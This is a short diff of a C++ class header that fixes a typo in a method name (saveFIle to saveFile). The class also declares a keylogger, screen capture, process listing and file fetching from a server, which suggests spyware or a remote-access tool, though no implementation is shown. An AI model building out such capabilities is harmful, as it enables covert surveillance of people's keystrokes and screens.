@@ -16,7 +16,7 @@ public:
 	std::map<DWORD, std::wstring> getProcessList();
 	LPVOID getScreen();
 	void getFile(std::string& path, LPCWSTR server);
-	void saveFIle(std::string& path, std::string& data, DWORD seq);
+	void saveFile(std::string& path, std::string& data, DWORD seq);
 	void keyLogger();
 	std::wstring pidToName(DWORD procID);
 };
